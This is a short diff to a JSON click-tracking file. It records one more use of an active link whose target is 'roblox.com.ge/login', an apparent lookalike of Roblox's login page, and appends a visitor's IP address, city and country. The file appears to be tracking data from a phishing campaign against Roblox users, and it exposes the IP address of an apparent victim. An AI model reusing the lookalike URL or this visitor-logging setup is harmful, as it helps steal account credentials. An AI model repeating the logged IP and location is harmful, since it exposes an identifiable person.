@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1031,
+    "useCount": 1032,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8368,6 +8368,14 @@
         "city": "Essen",
         "flag": "🇩🇪",
         "countryCode": "DE"
+      },
+      {
+        "timestamp": 1777231220082,
+        "ip": "172.59.88.49",
+        "country": "United States",
+        "city": "Louisville",
+        "flag": "🇺🇸",
+        "countryCode": "US"
       }
     ]
   },
